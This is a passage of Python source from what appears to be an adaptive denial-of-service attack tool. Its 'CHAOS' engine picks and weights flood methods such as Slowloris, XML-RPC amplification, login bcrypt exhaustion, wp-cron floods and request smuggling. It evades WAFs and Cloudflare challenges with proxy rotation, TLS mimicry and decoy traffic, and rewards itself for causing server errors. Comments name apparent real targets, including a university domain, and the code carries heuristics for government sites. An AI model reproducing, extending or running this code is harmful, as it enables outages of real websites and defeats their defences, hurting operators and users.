        cms = intel.get("cms_type", "custom")
        cms_boosts = {
            "wordpress": {"XMLRPC_AMP": 65, "WP_SEARCH": 75},
            "joomla":    {"DYN": 40, "POST_DYN": 40},
            "drupal":    {"DYN": 35, "POST_DYN": 35, "POST": 30},
            "shopify":   {"STEALTH_JA3": 60, "SLOW_V2": 35},
            "laravel":   {"POST_DYN": 45, "DYN": 35, "POST": 30},
            "nextjs":    {"POST_DYN": 35, "DYN": 30},
        }
        if cms in cms_boosts:
            for k, v in cms_boosts[cms].items():
                weights[k] = max(weights.get(k, 0), v)
                
        # === STRATEGY C: Endpoint-Aware Targeting ===
        discovered = intel.get("endpoints_discovered", [])
        if '/xmlrpc.php' in discovered:
            weights["XMLRPC_AMP"] = max(weights.get("XMLRPC_AMP", 0), 70)
        if '/graphql' in discovered or '/api/' in discovered:
            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 40)
            weights["POST"] = max(weights.get("POST", 0), 30)
            
        # === STRATEGY D: Real-Time Battlefield Adaptation ===
        proxy_burn_ratio = 0
        if hasattr(self, '_proxies') and self._proxies:
            proxy_burn_ratio = len(BURNED_PROXIES) / max(len(self._proxies), 1)
            
        if IS_RECYCLING or proxy_burn_ratio > 0.4:
            weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 50)
            weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 70)
            weights["STRESS"] = 0
            weights["PPS"] = 0
            weights["GET"] = max(weights["GET"] // 2, 1)
        elif proxy_burn_ratio < 0.05 and phase != "PROBE":
            weights["STRESS"] = max(weights.get("STRESS", 0), 20)
            weights["PPS"] = max(weights.get("PPS", 0), 15)
            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 30)
        
        # === STRATEGY E: Response Time Intelligence ===
        rt = intel.get("response_time_ms", 0)
        if rt > 3000:
            # Target is already slow. It's weak. Hammer it harder
            weights["STRESS"] = max(weights.get("STRESS", 0), 25)
            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 35)
        elif rt < 100:
            # Target is behind CDN cache. Need to bypass cache
            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 30)
            weights["DYN"] = max(weights.get("DYN", 0), 25)
            weights["GET"] = max(weights["GET"] // 2, 2)  # Cached GETs do nothing
        
        # === STRATEGY F: Phase-Based Modifiers ===
        if phase == "PROBE":
            # Equal opportunity: test everything
            for k in weights:
                if weights[k] > 0:
                    weights[k] = max(weights[k], 10)
                    
        elif phase == "CALIBRATE":
            # Start rewarding winners
            best = intel.get("best_method")
            if best and best in weights:
                weights[best] = int(weights[best] * 1.5)
                
        elif phase == "ASSAULT":
            # Maximum aggression on proven methods
            best = intel.get("best_method")
            worst = intel.get("worst_method")
            if best and best in weights:
                weights[best] = int(weights[best] * 2.0)
            if worst and worst in weights:
                weights[worst] = max(weights[worst] // 3, 1)
                
        elif phase == "FINISH":
            # Target is dying. All-in with heavy methods
            weights["STRESS"] = max(weights.get("STRESS", 0), 40)
            weights["PPS"] = max(weights.get("PPS", 0), 30)
            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 40)
            weights["GET"] = max(weights.get("GET", 0), 25)
            
        elif phase == "SUSTAIN":
            # Long-duration: mix stealth to avoid getting cut
            weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 30)
            weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 20)
        
        # === STRATEGY G: Reinforcement Learning with Sliding Window ===
        history = intel.get("success_history", {})
        for method_name, results in history.items():
            if method_name not in weights:
                continue
            recent = results[-20:]  # Last 20 results only (sliding window)
            if not recent:
                continue
            success_rate = sum(recent) / len(recent)
            
            if success_rate > 0.8:
                weights[method_name] = int(weights[method_name] * 1.5)
            elif success_rate > 0.5:
                weights[method_name] = int(weights[method_name] * 1.2)
            elif success_rate < 0.2:
                weights[method_name] = max(int(weights[method_name] * 0.3), 1)
            elif success_rate < 0.4:
                weights[method_name] = max(int(weights[method_name] * 0.6), 1)
                
            # Track best and worst performers
            if not intel["best_method"] or success_rate > history.get(intel["best_method"], [0])[-1:][0] if history.get(intel["best_method"]) else 0:
                intel["best_method"] = method_name
            if not intel["worst_method"] or (success_rate < 0.3 and len(recent) > 5):
                intel["worst_method"] = method_name
        
        # === STRATEGY H: Experience Database Lookup ===
        # Check if we have pre-coded knowledge for this exact target profile
        server = intel.get("server_type", "unknown")
        experience_key = (waf, server, cms)
        if experience_key in self._EXPERIENCE_DB:
            exp_bonuses = self._EXPERIENCE_DB[experience_key]
            for method_name, bonus in exp_bonuses.items():
                weights[method_name] = max(weights.get(method_name, 0), bonus)
            if int(REQUESTS_SENT) < 10:
                print(f"{bcolors.OKGREEN}[CHAOS] Experience match found: {experience_key} -> Applying veteran tactics{bcolors.RESET}")
        else:
            # Try partial matches (waf, *, cms) or (*, server, cms)
            for exp_key, exp_bonuses in self._EXPERIENCE_DB.items():
                if exp_key[0] == waf and exp_key[2] == cms:
                    for method_name, bonus in exp_bonuses.items():
                        weights[method_name] = max(weights.get(method_name, 0), int(bonus * 0.7))
                    break
                    
        # === STRATEGY I: Anti-Pattern Detection ===
        # If WAF is catching our pattern (3+ consecutive blocks), trigger emergency evasion
        if intel["consecutive_block"] >= 3:
            intel["emergency_evasion"] = True
            # Force a completely different method from last 3
            last_3 = intel.get("last_3_methods", [])
            for method_name in last_3:
                if method_name in weights:
                    weights[method_name] = 1  # Nearly zero out recently used methods
            # Boost unused methods
            for method_name in weights:
                if method_name not in last_3 and weights[method_name] > 0:
                    weights[method_name] = int(weights[method_name] * 1.5)
        else:
            intel["emergency_evasion"] = False
            
        # === STRATEGY J: Combo Chain Selection ===
        # Every 10-15 executions, plan a coordinated combo instead of random picks
        if not intel.get("combo_queue") and intel["total_executions"] % randint(10, 15) == 0:
            # Select the best combo chain based on current intel
            if cms == "wordpress":
                intel["combo_queue"] = list(self._COMBO_CHAINS["wp_annihilator" if '/xmlrpc.php' in discovered else "db_destroyer"])
            elif waf in ("cloudflare", "akamai", "ddosguard", "fastly"):
                intel["combo_queue"] = list(self._COMBO_CHAINS["stealth_burst"])
            elif waf in ("imperva",):
                intel["combo_queue"] = list(self._COMBO_CHAINS["cookie_monster"])
            elif waf == "none" and phase == "ASSAULT":
                intel["combo_queue"] = list(self._COMBO_CHAINS["blitz_krieg"])
            elif phase == "SUSTAIN":
                intel["combo_queue"] = list(self._COMBO_CHAINS["slow_siege"])
            else:
                intel["combo_queue"] = list(self._COMBO_CHAINS["polymorphic_wave"])
                
        # === STRATEGY K: Efficiency Scoring ===
        # Boost methods with best success/attempt ratios
        for method_name, history_list in intel.get("success_history", {}).items():
            if method_name in weights and len(history_list) >= 10:
                recent = history_list[-20:]
                efficiency = sum(recent) / len(recent)
                intel["efficiency_score"][method_name] = efficiency
                
                # Find the weakpoint (highest efficiency method with high weight)
                if efficiency > 0.8 and weights.get(method_name, 0) > 20:
                    intel["target_weakpoint"] = method_name
        
        # === STRATEGY L: WAF Counter-Intelligence ===
        # If WAF is adapting to us, radically shift the entire strategy
        if intel.get("waf_adapting"):
            # Scramble everything: swap high and low weights
            sorted_methods = sorted(weights.items(), key=lambda x: -x[1])
            if len(sorted_methods) >= 4:
                # Boost the bottom methods, suppress the top ones
                for i, (method, w) in enumerate(sorted_methods):
                    if i < 3:  # Top 3 most used
                        weights[method] = max(w // 4, 1)
                    elif i >= len(sorted_methods) - 3:  # Bottom 3 least used
                        weights[method] = max(w * 3, 20)
                        
        # === STRATEGY M: Target Health Exploitation ===
        if intel.get("target_getting_weaker"):
            # Target is weakening! Escalate pressure with heavy methods
            weights["STRESS"] = max(weights.get("STRESS", 0), 35)
            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 40)
            weights["PPS"] = max(weights.get("PPS", 0), 25)
            
        if intel.get("target_is_down"):
            # Target is DOWN! Switch to sustain mode to keep it down
            weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 50)
            weights["GET"] = max(weights.get("GET", 0), 20)
            # Reduce heavy methods to conserve resources
            weights["STRESS"] = max(weights.get("STRESS", 0) // 2, 5)
            weights["PPS"] = max(weights.get("PPS", 0) // 2, 5)
            
        # === STRATEGY O: Temperature-Based Aggression ===
        temp = intel.get("temperature", 0.5)
        if temp > 0.7:
            # HOT: Boost aggressive methods
            for m in ["STRESS", "PPS", "POST_DYN", "XMLRPC_AMP", "WP_SEARCH"]:
                if m in weights and weights[m] > 0:
                    weights[m] = int(weights[m] * (1 + temp))
        elif temp < 0.35:
            # COLD: Boost stealth methods
            for m in ["STEALTH_JA3", "SLOW_V2", "BOT", "COOKIE"]:
                if m in weights:
                    weights[m] = max(weights.get(m, 0), int(30 / max(temp, 0.1)))
            for m in ["STRESS", "PPS"]:
                if m in weights:
                    weights[m] = max(int(weights[m] * temp), 1)
                    
        # === STRATEGY P: Wave State Modifiers ===
        wave = intel.get("wave_state", "RISE")
        if wave == "PEAK":
            # Maximum firepower
            for m in weights:
                if weights[m] > 10:
                    weights[m] = int(weights[m] * 1.4)
        elif wave == "REST":
            # Minimal footprint, only decoys and stealth
            for m in weights:
                if m not in ("STEALTH_JA3", "SLOW_V2", "BOT"):
                    weights[m] = max(weights[m] // 3, 1)
        elif wave == "FALL":
            # Gradual reduction
            for m in weights:
                if m not in ("STEALTH_JA3", "SLOW_V2"):
                    weights[m] = max(int(weights[m] * 0.7), 1)
        
        # === STRATEGY S: WAF Rule-Specific Counter-Tactics ===
        rules = intel.get("waf_rules_triggered", [])
        if "rate_limited" in rules or "rate_limit" in rules or "1015" in str(rules):
            # WAF is rate limiting. Maximum stealth, minimum volume
            weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 80)
            weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 50)
            weights["STRESS"] = 0
            weights["PPS"] = 0
        if "js_challenge" in rules or "browser_check" in rules:
            # JS challenge active. Only TLS-mimicking methods work
            weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 90)
            weights["GET"] = 1
            weights["POST"] = 1
        if "captcha_required" in rules:
            # Captcha active. Need cf_clearance + stealth
            weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 85)
            weights["BOT"] = max(weights.get("BOT", 0), 20)
        if "firewall_rule" in rules or "rule_block" in rules:
            # Specific firewall rules. Shift away from blocked patterns entirely
            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 40)
            weights["DYN"] = max(weights.get("DYN", 0), 35)
            weights["COOKIE"] = max(weights.get("COOKIE", 0), 25)
        
        # === STRATEGY T: Adaptive RPC Application ===
        # Apply learned optimal requests-per-connection to avoid detection
        adaptive_rpc = intel.get("adaptive_rpc", 10)
        if adaptive_rpc < 5:
            # Very restricted. Only stealth methods can handle low RPC
            weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 60)
            weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 40)
        
        # === STRATEGY U: Cookie Trust Exploitation ===
        # If we've harvested cookies, our requests have higher trust
        if intel.get("harvested_cookies"):
            # Cookies make all methods more effective
            weights["COOKIE"] = max(weights.get("COOKIE", 0), 30)
            weights["POST_DYN"] = int(weights.get("POST_DYN", 0) * 1.2)
            weights["DYN"] = int(weights.get("DYN", 0) * 1.2)
        
        # === STRATEGY Q: Cache Bypass Intelligence ===
        # If we've discovered uncached paths, boost POST/DYN methods that use them
        uncached = intel.get("uncached_paths", [])
        cached = intel.get("cached_paths", [])
        if len(uncached) > len(cached):
            # We have good cache-busting paths. Boost methods that use dynamic paths
            weights["DYN"] = max(weights.get("DYN", 0), 30)
            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 35)
        elif len(cached) > 3 and not uncached:
            # Everything is cached. GET is useless. Shift to POST-heavy
            weights["GET"] = max(weights["GET"] // 3, 1)
            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 40)
            weights["POST"] = max(weights.get("POST", 0), 25)
        
        # === STRATEGY R: Referer Trust Building ===
        # If we have a session journey, stealth methods become more effective
        if intel.get("referer_chain"):
            weights["STEALTH_JA3"] = int(weights.get("STEALTH_JA3", 0) * 1.2)
            weights["BOT"] = max(weights.get("BOT", 0), 15)
        
        # === STRATEGY N: Exploration Bonus ===
        # In early phases, give bonus weight to methods we haven't tried yet
        if intel.get("exploration_bonus") and phase in ("PROBE", "CALIBRATE"):
            tried = intel.get("methods_tried_count", {})
            for method_name in weights:
                if method_name not in tried and weights[method_name] > 0:
                    weights[method_name] = max(weights[method_name], 15)
            # Disable exploration after CALIBRATE
            if phase == "ASSAULT":
                intel["exploration_bonus"] = False
        
        # === STRATEGY Z: Backend Exploitation ===
        backend = intel.get("backend_lang", "unknown")
        if backend in self._BACKEND_WEAKNESSES:
            backend_data = self._BACKEND_WEAKNESSES[backend]
            for method_name, bonus in backend_data["methods"].items():
                weights[method_name] = max(weights.get(method_name, 0), bonus)
                
        # === STRATEGY AA: Resource-Targeted Attack ===
        resource = intel.get("resource_target", "auto")
        if resource != "auto" and resource in self._RESOURCE_TARGETS:
            resource_weights = self._RESOURCE_TARGETS[resource]
            for method_name, bonus in resource_weights.items():
                weights[method_name] = max(weights.get(method_name, 0), bonus)
                
        # === STRATEGY AB: Time-of-Day Intensity ===
        time_mult = intel.get("time_intensity", 1.0)
        if time_mult != 1.0:
            for m in weights:
                weights[m] = int(weights[m] * time_mult)
                
        # === STRATEGY AF: XMLRPC Availability Intelligence (V33) ===
        xmlrpc_status = intel.get("infra_map", {}).get("xmlrpc_status", "UNKNOWN")
        if xmlrpc_status == "BLOCKED":
            # WAF blocks XMLRPC - don't waste firepower on it
            weights["XMLRPC_AMP"] = 0
        elif xmlrpc_status in ("OPEN", "POST_ONLY"):
            # XMLRPC is available - boost it significantly
            weights["XMLRPC_AMP"] = max(weights.get("XMLRPC_AMP", 0), 90)
            
        # === STRATEGY AG: Livewire Exploitation (V33) ===
        if intel.get("infra_map", {}).get("livewire"):
            # Laravel Livewire uses heavy POST AJAX calls - exploit this
            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 85)
            
        # === STRATEGY AO: Vercel Ultra-Strict Mode (V36) ===
        if intel.get("infra_map", {}).get("vercel"):
            # Vercel blocks EVERYTHING except stealth. Suppress all heavy methods.
            for m in weights:
                if m not in ("STEALTH_JA3", "SLOW_V2", "COOKIE", "BOT"):
                    weights[m] = 0
            weights["STEALTH_JA3"] = 100
            
        # === STRATEGY AP: Nuxt.js SSR Exploit (V36) ===
        if intel.get("infra_map", {}).get("nuxtjs"):
            # Nuxt SSR renders full page server-side. Each unique URL = full render cycle
            weights["DYN"] = max(weights.get("DYN", 0), 70)
            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 65)
            
        # === STRATEGY AQ: CodeIgniter Brute Force (V36) ===
        if intel.get("infra_map", {}).get("ci_detected"):
            # CI has no built-in protection. Full brute force works.
            weights["STRESS"] = max(weights.get("STRESS", 0), 70)
            weights["PPS"] = max(weights.get("PPS", 0), 60)
            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 75)

        # === STRATEGY AR: Exposed .env = Weak Server (V36) ===
        if intel.get("infra_map", {}).get("env_exposed"):
            # Server admin is incompetent. Go full aggression, no stealth needed.
            intel["temperature"] = min(intel.get("temperature", 0) + 0.3, 1.0)
            weights["STRESS"] = max(weights.get("STRESS", 0), 80)
            
        # === STRATEGY AS: Caddy Goroutine Memory Exhaustion (V36) ===
        if intel.get("infra_map", {}).get("caddy_proxy"):
            weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 85)

        # === STRATEGY AL: Request Smuggling Boost (V35) ===
        if intel.get("request_smuggling_active"):
            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 90)
            weights["POST"] = max(weights.get("POST", 0), 70)
            
        # === STRATEGY AM: Server Exhaustion Signal Response (V35) ===
        error_pats = intel.get("server_error_patterns", [])
        if "CONN_POOL_FULL" in error_pats or "DB_CONN_EXHAUSTED" in error_pats:
            weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 100)
        if "MEMORY_EXHAUSTED" in error_pats:
            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 100)
        if any(x in error_pats for x in ["HTTP_502", "HTTP_503", "HTTP_504"]):
            # Server is dying! Maximum force on everything
            intel["temperature"] = 1.0
            
        # === STRATEGY AN: Entropy-Driven Exploration (V35) ===
        if intel.get("entropy_score", 5.0) < 2.0:
            # Traffic too predictable, inject diversity
            for m in weights:
                if weights[m] == 0:
                    weights[m] = randint(5, 15)

        # === STRATEGY AI: WP-Cron Exploitation Boost (V34) ===
        if intel.get("wp_cron_available"):
            # wp-cron is open - GET floods on wp-cron.php force task execution
            weights["GET"] = max(weights.get("GET", 0), 65)
            
        # === STRATEGY AJ: Login Bcrypt Exhaustion (V34) ===
        if intel.get("login_endpoint"):
            # Login endpoint exists - POST_DYN floods force bcrypt password hashing
            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 80)
            
        # === STRATEGY AK: Decoy Traffic Injection (V34) ===
        # Mix 15% of traffic as normal browsing to avoid anomaly detection
        if intel.get("smart_decoy_paths") and randint(1, 100) <= 15:
            weights["BOT"] = max(weights.get("BOT", 0), 40)  # BOT mimics real browsers

        # === STRATEGY AH: Heavy Page Detection (V33) ===
        # hardosoloplast has 273KB pages (3.5s response) - GET flood alone kills it
        baseline_ms = intel.get("response_time_ms", 100)
        if baseline_ms > 2000:
            # Server is already slow. GET spam will finish it.
            weights["GET"] = max(weights.get("GET", 0), 70)
            weights["DYN"] = max(weights.get("DYN", 0), 60)

        # === STRATEGY AE: Predictive Machine Learning Optimization ===
        # Use our trained ML model to forecast likelihood of evasion success
        if intel.get("ml_predictions_enabled"):
            for m in list(weights.keys()):
                prob = self._chaos_ml_predict(m)
                if prob > 0.85:
                    # ML thinks this has >85% success rate: MASSIVE boost
                    weights[m] = int(weights[m] * 1.5)
                elif prob > 0.6:
                    # ML thinks it's favorable: Mild boost
                    weights[m] = int(weights[m] * 1.2)
                elif prob < 0.2:
                    # ML predicts failure: Heavily suppress to save bandwidth for better methods
                    weights[m] = max(weights[m] // 2, 1)
                    
        # === STRATEGY AD: Hot Streak Exploitation ===
        hot = intel.get("hot_streak_method")
        if hot and hot in weights and phase in ("CALIBRATE", "ASSAULT", "FINISH"):
            # A method is on fire! Double down
            weights[hot] = int(weights[hot] * 1.6)
        
        # === STRATEGY AC: Cognitive State Modifiers ===
        cognitive = intel.get("cognitive_state", "LEARNING")
        if cognitive == "LEARNING":
            # Explore broadly, don't commit too hard to anything
            for m in weights:
                if weights[m] > 0:
                    weights[m] = max(weights[m], 8)
        elif cognitive == "EXPLOITING":
            # Focus on what's working
            best = intel.get("best_method")
            if best and best in weights:
                weights[best] = int(weights[best] * 1.4)
        elif cognitive == "MASTERING":
            # Maximum precision: evolved DNA + weakpoint
            wp = intel.get("target_weakpoint")
            if wp and wp in weights:
                weights[wp] = int(weights[wp] * 1.8)
            # Also suppress consistently bad methods hard
            worst = intel.get("worst_method")
            if worst and worst in weights:
                weights[worst] = max(weights[worst] // 5, 1)
        
        # === STRATEGY X: Kill Chain Phase Strategy ===
        kc_phase = intel.get("kill_chain_phase", "PROBE")
        
        if kc_phase == "WEAKEN":
            # Objective: exhaust connections. Prioritize Slowloris + many connections
            weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 45)
            weights["GET"] = max(weights.get("GET", 0), 20)
            weights["COOKIE"] = max(weights.get("COOKIE", 0), 20)
            
        elif kc_phase == "BREACH":
            # Objective: concentrated force on weakpoint
            wp = intel.get("target_weakpoint")
            if wp and wp in weights:
                weights[wp] = int(weights[wp] * 2.5)
            # Also boost heavy methods
            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 45)
            weights["STRESS"] = max(weights.get("STRESS", 0), 30)
            
        elif kc_phase == "OVERWHELM":
            # Objective: everything at maximum
            for m in weights:
                if weights[m] > 5:
                    weights[m] = int(weights[m] * 1.8)
                    
        elif kc_phase == "SUSTAIN_KILL":
            # Objective: minimum effort to keep target down
            for m in weights:
                weights[m] = max(weights[m] // 2, 1)
            weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 40)
            weights["GET"] = max(weights.get("GET", 0), 15)
        
        # === STRATEGY Y: Recovery Counter-Strike ===
        if intel.get("recovery_detected") and intel.get("recovery_counter", 0) > 0:
            # Target has recovered before. Hit harder this time
            multiplier = 1.0 + (intel["recovery_counter"] * 0.3)
            wp = intel.get("target_weakpoint")
            if wp and wp in weights:
                weights[wp] = int(weights[wp] * multiplier)
            weights["STRESS"] = max(int(weights.get("STRESS", 0) * multiplier), 20)
            weights["POST_DYN"] = max(int(weights.get("POST_DYN", 0) * multiplier), 25)
        
        # === STRATEGY V: Genetic DNA Override ===
        # If we have evolved DNA from the genetic algorithm, blend it in
        dna = intel.get("current_dna")
        if dna and phase not in ("PROBE",):
            blend_factor = min(intel.get("generation", 0) / 10, 0.6)  # Max 60% DNA influence
            for method_name, dna_weight in dna.items():
                if method_name in weights:
                    # Blend: (1-factor)*planned + factor*evolved
                    weights[method_name] = int(weights[method_name] * (1 - blend_factor) + dna_weight * blend_factor)
        
        # === STRATEGY W: Rate Limit Awareness ===
        threshold = intel.get("rate_limit_threshold")
        if threshold is not None:
            if threshold < 8:
                # Very strict rate limit. Go maximum stealth
                weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 85)
                weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 50)
                weights["STRESS"] = 0
                weights["PPS"] = 0
            elif threshold < 15:
                # Moderate rate limit. Balance stealth and power
                weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 50)
                weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 25)
        
        # === FILTER: Remove unavailable methods ===
        if not HAS_TLS_CLIENT:
            weights["STEALTH_JA3"] = 0
        if not hasattr(self, '_cf_clearance') or not self._cf_clearance:
            if waf == "cloudflare":
                weights["BOT"] = max(weights.get("BOT", 0) // 2, 2)
        
        return weights
        
    def _chaos_learn(self, method_name, success, got_5xx=False):
        """Phase 5: Reinforcement Learning with sliding window memory + proxy affinity."""
        intel = self._chaos_intel
        
        # Sliding window: keep last 50 results per method
        if method_name not in intel["success_history"]:
            intel["success_history"][method_name] = []
        intel["success_history"][method_name].append(1 if success else 0)
        if len(intel["success_history"][method_name]) > 50:
            intel["success_history"][method_name] = intel["success_history"][method_name][-50:]
        
        # Track proxy-method affinity
        if hasattr(self, '_current_proxy_addr'):
            self._chaos_track_proxy_affinity(method_name, self._current_proxy_addr, success)
        
        # Track hot streaks
        self._chaos_hot_streak(method_name, success)
        
        # Track WAF anomaly score
        self._chaos_track_anomaly(not success)
        
        # Train ML Model
        self._chaos_ml_train(method_name, success)
        
        # Q-Learning Bellman Update
        old_state = intel.get("current_state", "PROBE")
        new_state = self._chaos_get_rl_state()
        intel["current_state"] = new_state
        
        # Calculate Reward
        reward = 0
        if success:
            reward = 10
            if got_5xx: reward = 50 # Massive reward for causing server errors
            if method_name == intel.get("battering_ram_method"): reward += 5 # Bonus for stealth evasion
        else:
            reward = -10 # Punishment for being blocked
            if intel.get("anomaly_score", 0) > 80: reward = -30 # Severe punishment for triggering WAF alarm
            
        self._chaos_rl_update_q(old_state, method_name, reward, new_state)
        # Calculate Wasted Bandwidth
        self._chaos_track_bandwidth(method_name, success)
        
        # Track consecutive blocks for emergency mode
        if not success:
            intel["consecutive_block"] += 1
        else:
            intel["consecutive_block"] = 0
            
        # Track server health signals
        if got_5xx:
            intel["consecutive_5xx"] += 1
        else:
            intel["consecutive_5xx"] = max(intel["consecutive_5xx"] - 1, 0)
            
        # Neural Markov State Transition training
        self._chaos_neural_markov_transition(method_name)
        
        # Record method for next anti-pattern check
        intel["last_method"] = method_name
    
    def CHAOS(self):
        """[V15] Grandmaster Tactical AI - Self-evolving attack engine with persistent
        memory, wave-based attack rhythm, dynamic combo generation, temperature-controlled
        aggression, and 20+ pre-coded experience patterns across all major WAF/CMS combos."""
        
        intel = self._chaos_intel
        
        # Record attack start time
        if intel["attack_start_time"] == 0:
            intel["attack_start_time"] = time()
        
        # Phase -1: LOAD PREVIOUS MEMORY (first call only)
        if not intel.get("recon_done") and not intel.get("_memory_checked"):
            intel["_memory_checked"] = True
            self._chaos_load_memory()  # Load battle experience from previous attacks
        
        # Phase 0: CONTINUOUS INTELLIGENCE GATHERING
        self._chaos_health_pulse()            # Monitor if target is weakening
        self._chaos_detect_waf_adaptation()   # Detect if WAF is learning us
        wave_state = self._chaos_wave_control()  # Update attack wave rhythm
        
        # Phase 1: DEEP RECON (runs only once per target)
        self._chaos_recon()
        
        # Phase 1.5: SESSION BUILDING (run once after recon to build trust)
        if intel["total_executions"] == 1:
            self._chaos_simulate_session()
        
        # Phase 1.6: AUTO-TUNE attack rate
        if intel["total_executions"] % 10 == 0:
            self._chaos_adaptive_rate()
        
        # Phase 1.7: BACKEND DETECTION (once after recon)
        if intel["total_executions"] == 2:
            self._chaos_detect_backend()
        
        # Phase 1.8: TIME-OF-DAY INTENSITY
        self._chaos_time_intensity()
        
        # Phase 1.9: COGNITIVE STATE TRACKING
        cognitive = self._chaos_cognitive_state()
        
        # Phase 1.10: KILL CHAIN PROTOCOL
        kc_phase = self._chaos_kill_chain()
        
        # Phase 1.11: BATTLE BRIEFING (shown once after all recon is complete)
        if intel["total_executions"] == 3 and not intel.get("briefing_shown"):
            self._chaos_battle_briefing()
            
        # Phase 1.11.2: BOTNET FINGERPRINT POOL INIT
        if intel["total_executions"] == 4:
            self._chaos_generate_fingerprints()
            
        # Phase 1.11.1.5: GTI Cross-Target Memory Sync
        if hasattr(self, '_chaos_gti_sync'):
            self._chaos_gti_sync()
        # Phase 1.10.5: SIEGE COMMANDER DOCTRINE
        self._chaos_siege_doctrine()
        self._chaos_circadian_rhythm()
        self._chaos_estimate_financial_damage()
        self._chaos_connection_pool_estimator()
        self._chaos_after_action_report()
        
        # Phase 1.10.6: SSL FINGERPRINTING (run once early)
        self._chaos_ssl_fingerprint()
        
        # Phase 1.10.7: V32 REAL-WORLD INTELLIGENCE MODULES
        self._chaos_laravel_xsrf_harvest()
        self._chaos_litespeed_cache_bypass()
        # [V36-FIX] WordPress Auto-Detect via wp-json probe (fixes uns.ac.id stub page)
        # If CMS is still unknown/custom but wp-json endpoint exists, override to wordpress
        if intel.get("cms_type") in ("custom", "unknown", None) and intel["total_executions"] == 12:
            try:
                import urllib.request
                req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}/wp-json/")
                req.add_header('User-Agent', 'Mozilla/5.0')
                try:
                    with urllib.request.urlopen(req, timeout=3) as resp:
                        if resp.status == 200:
                            intel["cms_type"] = "wordpress"
                            print(f"{bcolors.OKCYAN}[CHAOS AUTO-WP] wp-json/ returned 200. CMS overridden to WordPress.{bcolors.RESET}")
                except urllib.error.HTTPError as e:
                    if e.code in (401, 405):
                        intel["cms_type"] = "wordpress"
                        print(f"{bcolors.OKCYAN}[CHAOS AUTO-WP] wp-json/ returned {e.code}. CMS overridden to WordPress (auth-protected).{bcolors.RESET}")
            except: pass
        self._chaos_wp_json_exploitation()
        self._chaos_wp_plugin_vulnerability_scan()
        self._chaos_xmlrpc_status_check()
        self._chaos_response_timing_profiler()
        # Phase 1.10.8: V35 ADVANCED INTELLIGENCE MODULES
        self._chaos_session_exhaustion()
        self._chaos_request_smuggling_probe()
        self._chaos_response_body_analyzer()
        self._chaos_timing_side_channel()
        self._chaos_genetic_payload_evolution()
        self._chaos_entropy_calculator()
        self._chaos_wp_cron_exploitation()
        self._chaos_login_flood_discovery()
        self._chaos_page_weight_analyzer()
        self._chaos_smart_decoy_traffic()
        self._chaos_waf_evasion_calculator()
        self._chaos_rate_limit_intelligence()
        self._chaos_codeigniter_detection()
        self._chaos_vercel_detection()
        self._chaos_env_exposure_check()
        self._chaos_university_heuristics()
        self._chaos_caddy_detection()
        self._chaos_gov_id_heuristics()
        
        self._chaos_dead_drop_dns()
        self._chaos_honeypot_scanner()
        self._chaos_build_topology_mesh()
        
        # Subnet/Quantum IP rotation to break Rate Limiters
        if intel.get("anomaly_score", 0) > 70 and len(PROXY_LIST) > 1000:
            intel["quantum_state_active"] = True
        else:
            intel["quantum_state_active"] = False
        self._chaos_adaptive_scaling()
        
        # Adjust internal loop multiplier dynamically
        self._rpc = intel.get("adaptive_threads", self._rpc)
        
        # Phase 1.11.2.5: TOPOLOGY EDGE MAPPING
        self._chaos_edge_node_detection()

        # Phase 1.11.3: SHADOW PROTOCOL CHECK
        self._chaos_shadow_protocol()
        
        # Phase 1.11.5: BROWSER JS ENGINE POLL (Retrieve fresh tokens from headless browsers)
        if intel["total_executions"] % 10 == 0:
            self._chaos_poll_js_engine()
            
        # Phase 1.12: PROXY SELF-HEALING (monitor pool health)
        self._chaos_self_heal_proxies()
        
        # Phase 1.13: SWARM SYNCHRONIZATION (multi-thread timing coordination)
        is_pulse_strike = self._chaos_swarm_sync()
        
        # Phase 1.8: PREDICTIVE MODELING (every 30s via health pulse)
        if intel["total_executions"] % 30 == 0:
            ttd = self._chaos_predict_ttd()
        
        # Phase 1.9: GENETIC EVOLUTION (every 100 executions)
        self._chaos_evolve_weights()
        
        # Phase 1.10: HTTP METHOD DIVERSIFICATION (2% of the time)
        if randint(1, 50) == 1:
            self._chaos_http_method_expand()
        
        # Phase 1.8: RATE LIMIT PROBING (exec 50 only)
        self._chaos_probe_rate_limit()
        
        # Phase 1.9: MULTI-PATH QUEUE REFRESH (every 50 executions)
        if intel["total_executions"] % 50 == 0:
            self._chaos_multi_path_targeting()
            
        # Phase 1.9.5: CHAOS LEGION MODE - AUTO SPAWN EXTERNAL CMD TERMINALS
        # Runs once after deep recon (exec 35) to physically open new terminal windows for orthogonal attacks
